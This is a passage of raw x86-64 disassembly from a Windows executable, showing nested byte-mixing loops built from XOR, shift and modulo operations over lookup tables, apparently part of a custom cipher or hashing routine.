   140003f01:	c0 e9 02             	shr    $0x2,%cl
   140003f04:	32 d1                	xor    %cl,%dl
   140003f06:	41 88 12             	mov    %dl,(%r10)
   140003f09:	49 ff c2             	inc    %r10
   140003f0c:	41 81 f9 00 01 00 00 	cmp    $0x100,%r9d
   140003f13:	7c 8b                	jl     0x140003ea0
   140003f15:	45 8b de             	mov    %r14d,%r11d
   140003f18:	41 0f b6 fc          	movzbl %r12b,%edi
   140003f1c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003f20:	4d 8b c7             	mov    %r15,%r8
   140003f23:	45 8b d3             	mov    %r11d,%r10d
   140003f26:	bb 00 01 00 00       	mov    $0x100,%ebx
   140003f2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003f30:	45 0f b6 08          	movzbl (%r8),%r9d
   140003f34:	42 8d 04 0f          	lea    (%rdi,%r9,1),%eax
   140003f38:	41 03 c3             	add    %r11d,%eax
   140003f3b:	25 ff 00 00 80       	and    $0x800000ff,%eax
   140003f40:	7d 09                	jge    0x140003f4b
   140003f42:	ff c8                	dec    %eax
   140003f44:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140003f49:	ff c0                	inc    %eax
   140003f4b:	48 63 c8             	movslq %eax,%rcx
   140003f4e:	41 8b c2             	mov    %r10d,%eax
   140003f51:	99                   	cltd
   140003f52:	41 ff c2             	inc    %r10d
   140003f55:	41 f7 fd             	idiv   %r13d
   140003f58:	42 0f b6 0c 39       	movzbl (%rcx,%r15,1),%ecx
   140003f5d:	48 63 c2             	movslq %edx,%rax
   140003f60:	32 0c 28             	xor    (%rax,%rbp,1),%cl
   140003f63:	41 32 c9             	xor    %r9b,%cl
   140003f66:	41 88 08             	mov    %cl,(%r8)
   140003f69:	49 ff c0             	inc    %r8
   140003f6c:	48 83 eb 01          	sub    $0x1,%rbx
   140003f70:	75 be                	jne    0x140003f30
   140003f72:	41 ff c3             	inc    %r11d
   140003f75:	41 83 fb 08          	cmp    $0x8,%r11d
   140003f79:	7c a5                	jl     0x140003f20
   140003f7b:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   140003f82:	00 
   140003f83:	48 8b ce             	mov    %rsi,%rcx
   140003f86:	4c 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%r10
   140003f8d:	00 
   140003f8e:	48 2b ca             	sub    %rdx,%rcx
   140003f91:	4c 2b d2             	sub    %rdx,%r10
   140003f94:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140003f99:	41 8b ed             	mov    %r13d,%ebp
   140003f9c:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140003fa1:	45 8b de             	mov    %r14d,%r11d
   140003fa4:	48 8b da             	mov    %rdx,%rbx
   140003fa7:	41 bd 03 00 00 00    	mov    $0x3,%r13d
   140003fad:	0f 1f 00             	nopl   (%rax)
   140003fb0:	45 0f b6 f3          	movzbl %r11b,%r14d
   140003fb4:	41 0f b6 c3          	movzbl %r11b,%eax
   140003fb8:	4d 03 fe             	add    %r14,%r15
   140003fbb:	41 32 c4             	xor    %r12b,%al
   140003fbe:	41 8b f3             	mov    %r11d,%esi
   140003fc1:	41 32 07             	xor    (%r15),%al
   140003fc4:	88 04 0b             	mov    %al,(%rbx,%rcx,1)
   140003fc7:	41 81 fb 00 01 00 00 	cmp    $0x100,%r11d
   140003fce:	0f 83 f3 00 00 00    	jae    0x1400040c7
   140003fd4:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140003fdb:	00 
   140003fdc:	41 8b c3             	mov    %r11d,%eax
   140003fdf:	99                   	cltd
   140003fe0:	8b ce                	mov    %esi,%ecx
   140003fe2:	f7 fd                	idiv   %ebp
   140003fe4:	83 e1 1f             	and    $0x1f,%ecx
   140003fe7:	48 8d 05 12 c0 ff ff 	lea    -0x3fee(%rip),%rax        # 0x140000000
   140003fee:	4c 8d 88 20 70 00 00 	lea    0x7020(%rax),%r9
   140003ff5:	4c 63 d2             	movslq %edx,%r10
   140003ff8:	4c 03 c9             	add    %rcx,%r9
   140003ffb:	41 8d 45 fe          	lea    -0x2(%r13),%eax
   140003fff:	99                   	cltd
   140004000:	4d 03 d4             	add    %r12,%r10
   140004003:	f7 fd                	idiv   %ebp
   140004005:	48 63 c2             	movslq %edx,%rax
   140004008:	46 0f b6 04 20       	movzbl (%rax,%r12,1),%r8d
   14000400d:	41 0f b6 02          	movzbl (%r10),%eax
   140004011:	c0 e0 03             	shl    $0x3,%al
   140004014:	41 32 01             	xor    (%r9),%al
   140004017:	c0 e0 03             	shl    $0x3,%al
   14000401a:	41 c0 e8 02          	shr    $0x2,%r8b
   14000401e:	44 32 c0             	xor    %al,%r8b
   140004021:	48 8d 05 d8 bf ff ff 	lea    -0x4028(%rip),%rax        # 0x140000000
   140004028:	44 32 84 01 00 70 00 	xor    0x7000(%rcx,%rax,1),%r8b
   14000402f:	00 
   140004030:	41 8d 43 02          	lea    0x2(%r11),%eax
   140004034:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   14000403b:	00 
   14000403c:	99                   	cltd
   14000403d:	f7 fd                	idiv   %ebp
   14000403f:	45 32 c3             	xor    %r11b,%r8b
   140004042:	44 88 03             	mov    %r8b,(%rbx)
   140004045:	48 63 c2             	movslq %edx,%rax
   140004048:	46 0f b6 24 20       	movzbl (%rax,%r12,1),%r12d
   14000404d:	41 8d 43 03          	lea    0x3(%r11),%eax
   140004051:	99                   	cltd
   140004052:	41 c0 e4 05          	shl    $0x5,%r12b
   140004056:	f7 fd                	idiv   %ebp
   140004058:	48 63 c2             	movslq %edx,%rax
   14000405b:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   14000405f:	41 0f b6 c3          	movzbl %r11b,%eax
   140004063:	c0 e9 04             	shr    $0x4,%cl
   140004066:	24 e3                	and    $0xe3,%al
   140004068:	44 32 e1             	xor    %cl,%r12b
   14000406b:	44 32 e0             	xor    %al,%r12b
   14000406e:	45 32 21             	xor    (%r9),%r12b
   140004071:	4c 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%r9
   140004078:	00 
   140004079:	45 32 e0             	xor    %r8b,%r12b
   14000407c:	4d 03 ce             	add    %r14,%r9
   14000407f:	44 88 23             	mov    %r12b,(%rbx)
   140004082:	41 0f b6 02          	movzbl (%r10),%eax
   140004086:	41 03 c3             	add    %r11d,%eax
   140004089:	41 0f b6 09          	movzbl (%r9),%ecx
   14000408d:	03 c8                	add    %eax,%ecx
   14000408f:	81 e1 ff 03 00 80    	and    $0x800003ff,%ecx
   140004095:	7d 0a                	jge    0x1400040a1
   140004097:	ff c9                	dec    %ecx
   140004099:	81 c9 00 fc ff ff    	or     $0xfffffc00,%ecx
   14000409f:	ff c1                	inc    %ecx
   1400040a1:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   1400040a8:	00 
   1400040a9:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400040ae:	48 63 c1             	movslq %ecx,%rax
   1400040b1:	0f b6 0c 24          	movzbl (%rsp),%ecx
   1400040b5:	32 0c 10             	xor    (%rax,%rdx,1),%cl
   1400040b8:	41 02 cc             	add    %r12b,%cl
   1400040bb:	44 0f b6 24 24       	movzbl (%rsp),%r12d
   1400040c0:	41 32 0f             	xor    (%r15),%cl
   1400040c3:	88 0b                	mov    %cl,(%rbx)
   1400040c5:	eb 04                	jmp    0x1400040cb
   1400040c7:	4e 8d 0c 32          	lea    (%rdx,%r14,1),%r9
   1400040cb:	48 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%rdi
   1400040d2:	00 
   1400040d3:	81 fe 80 00 00 00    	cmp    $0x80,%esi
   1400040d9:	73 76                	jae    0x140004151
   1400040db:	41 8b c3             	mov    %r11d,%eax
   1400040de:	4c 8d 35 1b bf ff ff 	lea    -0x40e5(%rip),%r14        # 0x140000000
   1400040e5:	99                   	cltd
   1400040e6:	48 8b cf             	mov    %rdi,%rcx
   1400040e9:	f7 fd                	idiv   %ebp
   1400040eb:	83 e6 1f             	and    $0x1f,%esi
   1400040ee:	48 63 c2             	movslq %edx,%rax
   1400040f1:	44 0f b6 04 08       	movzbl (%rax,%rcx,1),%r8d
   1400040f6:	41 8d 43 04          	lea    0x4(%r11),%eax
   1400040fa:	99                   	cltd
   1400040fb:	41 c0 e0 02          	shl    $0x2,%r8b
   1400040ff:	f7 fd                	idiv   %ebp
   140004101:	45 32 c3             	xor    %r11b,%r8b
   140004104:	48 63 c2             	movslq %edx,%rax
   140004107:	41 c0 e0 03          	shl    $0x3,%r8b
   14000410b:	0f b6 0c 08          	movzbl (%rax,%rcx,1),%ecx
   14000410f:	41 8d 43 05          	lea    0x5(%r11),%eax
   140004113:	c0 e9 03             	shr    $0x3,%cl
   140004116:	99                   	cltd
   140004117:	44 32 c1             	xor    %cl,%r8b
   14000411a:	46 32 84 36 00 70 00 	xor    0x7000(%rsi,%r14,1),%r8b
   140004121:	00 
   140004122:	f7 fd                	idiv   %ebp
   140004124:	46 88 04 13          	mov    %r8b,(%rbx,%r10,1)
   140004128:	48 63 c2             	movslq %edx,%rax
   14000412b:	0f b6 0c 38          	movzbl (%rax,%rdi,1),%ecx
   14000412f:	41 0f b6 01          	movzbl (%r9),%eax
   140004133:	c0 e1 03             	shl    $0x3,%cl
   140004136:	42 32 8c 36 20 70 00 	xor    0x7020(%rsi,%r14,1),%cl
   14000413d:	00 
   14000413e:	d0 e8                	shr    $1,%al
   140004140:	32 c8                	xor    %al,%cl
   140004142:	41 32 0f             	xor    (%r15),%cl
   140004145:	41 32 c8             	xor    %r8b,%cl
   140004148:	41 32 cc             	xor    %r12b,%cl
   14000414b:	42 88 0c 13          	mov    %cl,(%rbx,%r10,1)
   14000414f:	eb 07                	jmp    0x140004158
   140004151:	8b ac 24 d8 00 00 00 	mov    0xd8(%rsp),%ebp
   140004158:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000415d:	41 ff c3             	inc    %r11d
   140004160:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   140004167:	00 
   140004168:	48 ff c3             	inc    %rbx
   14000416b:	4c 8b bc 24 c8 00 00 	mov    0xc8(%rsp),%r15
   140004172:	00 
   140004173:	41 ff c5             	inc    %r13d
   140004176:	41 81 fb 00 04 00 00 	cmp    $0x400,%r11d
   14000417d:	0f 8c 2d fe ff ff    	jl     0x140003fb0
   140004183:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   14000418a:	00 
   14000418b:	33 d2                	xor    %edx,%edx
   14000418d:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
   140004194:	00 
   140004195:	41 0f b6 cc          	movzbl %r12b,%ecx
   140004199:	41 0f b6 c4          	movzbl %r12b,%eax
   14000419d:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400041a3:	c0 e1 04             	shl    $0x4,%cl
   1400041a6:	44 8b ca             	mov    %edx,%r9d
   1400041a9:	89 44 24 18          	mov    %eax,0x18(%rsp)
   1400041ad:	44 8b d2             	mov    %edx,%r10d
   1400041b0:	83 c0 fe             	add    $0xfffffffe,%eax
   1400041b3:	88 4c 24 02          	mov    %cl,0x2(%rsp)
   1400041b7:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400041bb:	44 8b da             	mov    %edx,%r11d
   1400041be:	44 89 44 24 0c       	mov    %r8d,0xc(%rsp)
   1400041c3:	89 54 24 08          	mov    %edx,0x8(%rsp)
   1400041c7:	89 54 24 04          	mov    %edx,0x4(%rsp)
   1400041cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400041d0:	45 8d 60 fe          	lea    -0x2(%r8),%r12d
   1400041d4:	8b da                	mov    %edx,%ebx
   1400041d6:	41 8b cc             	mov    %r12d,%ecx
   1400041d9:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   1400041dd:	83 e1 1f             	and    $0x1f,%ecx
   1400041e0:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400041e5:	7d 09                	jge    0x1400041f0
   1400041e7:	ff c8                	dec    %eax
   1400041e9:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400041ee:	ff c0                	inc    %eax
   1400041f0:	48 98                	cltq
   1400041f2:	49 03 c6             	add    %r14,%rax
   1400041f5:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400041fa:	41 8b c0             	mov    %r8d,%eax
   1400041fd:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140004202:	7d 07                	jge    0x14000420b
   140004204:	ff c8                	dec    %eax
   140004206:	83 c8 80             	or     $0xffffff80,%eax
   140004209:	ff c0                	inc    %eax
   14000420b:	48 98                	cltq
   14000420d:	48 03 84 24 c0 00 00 	add    0xc0(%rsp),%rax
   140004214:	00 
   140004215:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000421a:	48 8d 05 df bd ff ff 	lea    -0x4221(%rip),%rax        # 0x140000000
   140004221:	48 8d 90 20 70 00 00 	lea    0x7020(%rax),%rdx
   140004228:	41 0f b6 f4          	movzbl %r12b,%esi
   14000422c:	48 03 d1             	add    %rcx,%rdx
   14000422f:	49 03 f6             	add    %r14,%rsi
   140004232:	48 8d 89 00 70 00 00 	lea    0x7000(%rcx),%rcx
   140004239:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000423e:	48 03 c8             	add    %rax,%rcx
   140004241:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140004246:	41 8d 43 04          	lea    0x4(%r11),%eax
   14000424a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000424f:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   140004253:	41 83 e4 7f          	and    $0x7f,%r12d
   140004257:	4c 03 a4 24 c0 00 00 	add    0xc0(%rsp),%r12
   14000425e:	00 
   14000425f:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   140004263:	89 44 24 14          	mov    %eax,0x14(%rsp)
   140004267:	41 8b c0             	mov    %r8d,%eax
   14000426a:	89 44 24 10          	mov    %eax,0x10(%rsp)
   14000426e:	66 90                	xchg   %ax,%ax
   140004270:	0f b6 2a             	movzbl (%rdx),%ebp
   140004273:	83 c0 fe             	add    $0xfffffffe,%eax
   140004276:	25 ff 00 00 80       	and    $0x800000ff,%eax
   14000427b:	7d 09                	jge    0x140004286
   14000427d:	ff c8                	dec    %eax
   14000427f:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   140004284:	ff c0                	inc    %eax
   140004286:	0f b6 09             	movzbl (%rcx),%ecx
   140004289:	4c 63 d8             	movslq %eax,%r11
   14000428c:	33 cd                	xor    %ebp,%ecx
   14000428e:	4d 03 df             	add    %r15,%r11
   140004291:	44 8b eb             	mov    %ebx,%r13d
   140004294:	8b c3                	mov    %ebx,%eax
   140004296:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   14000429b:	99                   	cltd
   14000429c:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   1400042a3:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   1400042aa:	00 
   1400042ab:	4c 63 fa             	movslq %edx,%r15
   1400042ae:	0f b6 54 24 01       	movzbl 0x1(%rsp),%edx
   1400042b3:	4c 03 ff             	add    %rdi,%r15
   1400042b6:	42 0f b6 3c 28       	movzbl (%rax,%r13,1),%edi
   1400042bb:	41 0f b6 03          	movzbl (%r11),%eax
   1400042bf:	33 c8                	xor    %eax,%ecx
   1400042c1:	0f b6 06             	movzbl (%rsi),%eax
   1400042c4:	33 c8                	xor    %eax,%ecx
   1400042c6:	41 0f b6 04 24       	movzbl (%r12),%eax
   1400042cb:	33 ca                	xor    %edx,%ecx
   1400042cd:	33 c8                	xor    %eax,%ecx
   1400042cf:	41 8d 04 39          	lea    (%r9,%rdi,1),%eax
   1400042d3:	45 0f b6 0f          	movzbl (%r15),%r9d
   1400042d7:	83 f1 71             	xor    $0x71,%ecx
   1400042da:	03 c1                	add    %ecx,%eax
   1400042dc:	44 03 c8             	add    %eax,%r9d
   1400042df:	41 81 e1 ff 03 00 80 	and    $0x800003ff,%r9d
   1400042e6:	7d 0d                	jge    0x1400042f5
   1400042e8:	41 ff c9             	dec    %r9d
   1400042eb:	41 81 c9 00 fc ff ff 	or     $0xfffffc00,%r9d
   1400042f2:	41 ff c1             	inc    %r9d
   1400042f5:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400042fa:	45 8d 34 18          	lea    (%r8,%rbx,1),%r14d
   1400042fe:	49 63 f1             	movslq %r9d,%rsi
   140004301:	48 03 b4 24 b0 00 00 	add    0xb0(%rsp),%rsi
   140004308:	00 
   140004309:	44 0f b6 00          	movzbl (%rax),%r8d
   14000430d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140004312:	44 33 c5             	xor    %ebp,%r8d
   140004315:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
   14000431c:	00 
   14000431d:	44 33 c2             	xor    %edx,%r8d
   140004320:	44 0f b6 1e          	movzbl (%rsi),%r11d
   140004324:	0f b6 00             	movzbl (%rax),%eax
   140004327:	44 33 c0             	xor    %eax,%r8d
   14000432a:	8b 44 24 08          	mov    0x8(%rsp),%eax
   14000432e:	41 03 c6             	add    %r14d,%eax
   140004331:	41 83 f0 71          	xor    $0x71,%r8d
   140004335:	44 33 44 24 04       	xor    0x4(%rsp),%r8d
   14000433a:	99                   	cltd
   14000433b:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   140004342:	48 63 c2             	movslq %edx,%rax
   140004345:	0f b6 0c 28          	movzbl (%rax,%rbp,1),%ecx
   140004349:	44 03 d1             	add    %ecx,%r10d
   14000434c:	45 03 d0             	add    %r8d,%r10d
   14000434f:	45 03 d3             	add    %r11d,%r10d
   140004352:	41 81 e2 ff 03 00 80 	and    $0x800003ff,%r10d
   140004359:	7d 0d                	jge    0x140004368
   14000435b:	41 ff ca             	dec    %r10d
   14000435e:	41 81 ca 00 fc ff ff 	or     $0xfffffc00,%r10d
   140004365:	41 ff c2             	inc    %r10d
   140004368:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   14000436f:	00 
   140004370:	49 63 d2             	movslq %r10d,%rdx
   140004373:	49 03 d0             	add    %r8,%rdx
   140004376:	0f b6 0a             	movzbl (%rdx),%ecx
   140004379:	41 8d 04 0b          	lea    (%r11,%rcx,1),%eax
   14000437d:	43 88 04 28          	mov    %al,(%r8,%r13,1)
   140004381:	41 0f b6 c3          	movzbl %r11b,%eax
   140004385:	40 32 c7             	xor    %dil,%al
   140004388:	41 d0 eb             	shr    $1,%r11b
   14000438b:	88 06                	mov    %al,(%rsi)
   14000438d:	40 0f b6 c7          	movzbl %dil,%eax
   140004391:	2a c1                	sub    %cl,%al
   140004393:	40 80 e7 0f          	and    $0xf,%dil
   140004397:	88 02                	mov    %al,(%rdx)
   140004399:	80 e1 07             	and    $0x7,%cl
   14000439c:	43 30 3c 28          	xor    %dil,(%r8,%r13,1)
   1400043a0:	41 8d 46 fe          	lea    -0x2(%r14),%eax
   1400043a4:	00 0e                	add    %cl,(%rsi)
   1400043a6:	44 30 1a             	xor    %r11b,(%rdx)
   1400043a9:	99                   	cltd
   1400043aa:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   1400043b1:	41 8b c2             	mov    %r10d,%eax
   1400043b4:	48 63 ca             	movslq %edx,%rcx
   1400043b7:	25 ff 00 00 80       	and    $0x800000ff,%eax
   1400043bc:	7d 09                	jge    0x1400043c7
   1400043be:	ff c8                	dec    %eax
   1400043c0:	0d 00 ff ff ff       	or     $0xffffff00,%eax
   1400043c5:	ff c0                	inc    %eax
   1400043c7:	0f b6 0c 29          	movzbl (%rcx,%rbp,1),%ecx
   1400043cb:	44 8b db             	mov    %ebx,%r11d
   1400043ce:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   1400043d5:	00 
   1400043d6:	41 83 e3 1f          	and    $0x1f,%r11d
   1400043da:	48 98                	cltq
   1400043dc:	32 0c 10             	xor    (%rax,%rdx,1),%cl
   1400043df:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400043e4:	32 08                	xor    (%rax),%cl
   1400043e6:	32 0e                	xor    (%rsi),%cl
   1400043e8:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400043ed:	0f b6 34 24          	movzbl (%rsp),%esi
   1400043f1:	32 08                	xor    (%rax),%cl
   1400043f3:	43 32 0c 28          	xor    (%r8,%r13,1),%cl
   1400043f7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400043fc:	40 32 ce             	xor    %sil,%cl
   1400043ff:	41 32 0c 24          	xor    (%r12),%cl
   140004403:	32 08                	xor    (%rax),%cl
   140004405:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
   14000440b:	0f 83 1d 01 00 00    	jae    0x14000452e
   140004411:	48 8d 05 e8 bb ff ff 	lea    -0x4418(%rip),%rax        # 0x140000000
   140004418:	0f b6 fb             	movzbl %bl,%edi
   14000441b:	0f b6 d3             	movzbl %bl,%edx
   14000441e:	80 e2 d7             	and    $0xd7,%dl
   140004421:	41 32 17             	xor    (%r15),%dl
   140004424:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   14000442b:	00 
   14000442c:	43 02 14 2f          	add    (%r15,%r13,1),%dl
   140004430:	02 d1                	add    %cl,%dl
   140004432:	41 32 94 03 00 70 00 	xor    0x7000(%r11,%rax,1),%dl
   140004439:	00 
   14000443a:	41 0f b6 84 03 20 70 	movzbl 0x7020(%r11,%rax,1),%eax
   140004441:	00 00 
   140004443:	c0 e8 02             	shr    $0x2,%al
   140004446:	32 d0                	xor    %al,%dl
   140004448:	8b 44 24 20          	mov    0x20(%rsp),%eax
   14000444c:	41 03 c6             	add    %r14d,%eax
   14000444f:	43 88 14 2f          	mov    %dl,(%r15,%r13,1)
   140004453:	25 ff 03 00 80       	and    $0x800003ff,%eax
   140004458:	7d 09                	jge    0x140004463
   14000445a:	ff c8                	dec    %eax
   14000445c:	0d 00 fc ff ff       	or     $0xfffffc00,%eax
   140004461:	ff c0                	inc    %eax
   140004463:	48 98                	cltq
   140004465:	46 0f b6 04 00       	movzbl (%rax,%r8,1),%r8d
   14000446a:	41 8b c6             	mov    %r14d,%eax
   14000446d:	41 c0 e8 04          	shr    $0x4,%r8b
   140004471:	25 7f 00 00 80       	and    $0x8000007f,%eax
   140004476:	7d 07                	jge    0x14000447f
   140004478:	ff c8                	dec    %eax
   14000447a:	83 c8 80             	or     $0xffffff80,%eax
   14000447d:	ff c0                	inc    %eax
   14000447f:	48 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%rbp
   140004486:	00 
   140004487:	48 98                	cltq
   140004489:	44 32 04 28          	xor    (%rax,%rbp,1),%r8b
   14000448d:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140004494:	00 
   140004495:	44 32 04 07          	xor    (%rdi,%rax,1),%r8b
   140004499:	44 32 c2             	xor    %dl,%r8b
   14000449c:	48 8d 15 5d bb ff ff 	lea    -0x44a3(%rip),%rdx        # 0x140000000
   1400044a3:	45 32 84 13 20 70 00 	xor    0x7020(%r11,%rdx,1),%r8b
   1400044aa:	00 
   1400044ab:	47 88 04 2f          	mov    %r8b,(%r15,%r13,1)
   1400044af:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
   1400044b5:	0f 83 85 00 00 00    	jae    0x140004540
   1400044bb:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   1400044c2:	00 
   1400044c3:	48 8d aa 00 70 00 00 	lea    0x7000(%rdx),%rbp
   1400044ca:	0f b6 c3             	movzbl %bl,%eax
   1400044cd:	49 03 eb             	add    %r11,%rbp
   1400044d0:	0c b3                	or     $0xb3,%al
   1400044d2:	40 32 c6             	xor    %sil,%al
   1400044d5:	48 8d b2 20 70 00 00 	lea    0x7020(%rdx),%rsi
   1400044dc:	02 c1                	add    %cl,%al
   1400044de:	49 03 f3             	add    %r11,%rsi
   1400044e1:	32 45 00             	xor    0x0(%rbp),%al
   1400044e4:	43 30 04 28          	xor    %al,(%r8,%r13,1)
   1400044e8:	8b 44 24 1c          	mov    0x1c(%rsp),%eax
   1400044ec:	4c 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%r11
   1400044f3:	00 
   1400044f4:	41 03 c6             	add    %r14d,%eax
   1400044f7:	99                   	cltd
   1400044f8:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   1400044ff:	48 63 c2             	movslq %edx,%rax
   140004502:	42 0f b6 0c 18       	movzbl (%rax,%r11,1),%ecx
   140004507:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000450c:	c0 e9 03             	shr    $0x3,%cl
   14000450f:	0f b6 00             	movzbl (%rax),%eax
   140004512:	c0 e0 05             	shl    $0x5,%al
   140004515:	43 02 04 28          	add    (%r8,%r13,1),%al
   140004519:	32 c8                	xor    %al,%cl
   14000451b:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140004522:	00 
   140004523:	32 0c 07             	xor    (%rdi,%rax,1),%cl
   140004526:	32 0e                	xor    (%rsi),%cl
   140004528:	43 88 0c 28          	mov    %cl,(%r8,%r13,1)
   14000452c:	eb 30                	jmp    0x14000455e
   14000452e:	4c 8b bc 24 b8 00 00 	mov    0xb8(%rsp),%r15
   140004535:	00 
   140004536:	48 8d 15 c3 ba ff ff 	lea    -0x453d(%rip),%rdx        # 0x140000000
   14000453d:	0f b6 fb             	movzbl %bl,%edi
   140004540:	49 8d ab 00 70 00 00 	lea    0x7000(%r11),%rbp
   140004547:	8b ff                	mov    %edi,%edi
   140004549:	48 8d b2 20 70 00 00 	lea    0x7020(%rdx),%rsi
   140004550:	49 03 f3             	add    %r11,%rsi
   140004553:	4c 8b 9c 24 d0 00 00 	mov    0xd0(%rsp),%r11
   14000455a:	00 
   14000455b:	48 03 ea             	add    %rdx,%rbp
   14000455e:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140004565:	00 
   140004566:	46 0f b6 04 28       	movzbl (%rax,%r13,1),%r8d
   14000456b:	41 8b c8             	mov    %r8d,%ecx
   14000456e:	03 4c 24 18          	add    0x18(%rsp),%ecx
   140004572:	03 4c 24 14          	add    0x14(%rsp),%ecx
   140004576:	81 e1 ff 00 00 80    	and    $0x800000ff,%ecx
   14000457c:	7d 0a                	jge    0x140004588
   14000457e:	ff c9                	dec    %ecx
   140004580:	81 c9 00 ff ff ff    	or     $0xffffff00,%ecx
   140004586:	ff c1                	inc    %ecx
   140004588:	41 8b c6             	mov    %r14d,%eax
   14000458b:	48 63 c9             	movslq %ecx,%rcx
   14000458e:	4c 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%r14
   140004595:	00 
   140004596:	99                   	cltd
   140004597:	f7 bc 24 d8 00 00 00 	idivl  0xd8(%rsp)
   14000459e:	ff c3                	inc    %ebx
   1400045a0:	48 63 c2             	movslq %edx,%rax
   1400045a3:	42 0f b6 14 39       	movzbl (%rcx,%r15,1),%edx
   1400045a8:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400045ad:	42 32 14 18          	xor    (%rax,%r11,1),%dl
   1400045b1:	42 32 14 37          	xor    (%rdi,%r14,1),%dl
   1400045b5:	8b 44 24 10          	mov    0x10(%rsp),%eax
   1400045b9:	41 32 d0             	xor    %r8b,%dl
   1400045bc:	32 16                	xor    (%rsi),%dl
   1400045be:	32 54 24 02          	xor    0x2(%rsp),%dl
   1400045c2:	32 55 00             	xor    0x0(%rbp),%dl
   1400045c5:	41 32 14 24          	xor    (%r12),%dl
   1400045c9:	48 8b ac 24 b0 00 00 	mov    0xb0(%rsp),%rbp
   1400045d0:	00 
   1400045d1:	ff c0                	inc    %eax
   1400045d3:	44 8b 44 24 0c       	mov    0xc(%rsp),%r8d
   1400045d8:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400045dd:	48 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%rdi
   1400045e4:	00 
   1400045e5:	42 88 54 2d 00       	mov    %dl,0x0(%rbp,%r13,1)
   1400045ea:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400045ef:	89 44 24 10          	mov    %eax,0x10(%rsp)
   1400045f3:	81 fb 00 04 00 00    	cmp    $0x400,%ebx
   1400045f9:	0f 8c 71 fc ff ff    	jl     0x140004270
   1400045ff:	44 8b 5c 24 08       	mov    0x8(%rsp),%r11d
   140004604:	41 ff c0             	inc    %r8d
   140004607:	83 44 24 04 02       	addl   $0x2,0x4(%rsp)
   14000460c:	41 ff cb             	dec    %r11d
   14000460f:	44 89 5c 24 08       	mov    %r11d,0x8(%rsp)
   140004614:	ba 00 00 00 00       	mov    $0x0,%edx
   140004619:	44 89 44 24 0c       	mov    %r8d,0xc(%rsp)
   14000461e:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   140004622:	3d 00 40 00 00       	cmp    $0x4000,%eax
   140004627:	0f 8c a3 fb ff ff    	jl     0x1400041d0
   14000462d:	bb fe ff ff ff       	mov    $0xfffffffe,%ebx
   140004632:	49 8b c7             	mov    %r15,%rax
   140004635:	48 2b c5             	sub    %rbp,%rax
   140004638:	89 5c 24 1c          	mov    %ebx,0x1c(%rsp)
   14000463c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004641:	8b f3                	mov    %ebx,%esi
   140004643:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   14000464a:	00 
   14000464b:	44 8b eb             	mov    %ebx,%r13d
   14000464e:	48 2b c5             	sub    %rbp,%rax
   140004651:	89 5c 24 18          	mov    %ebx,0x18(%rsp)
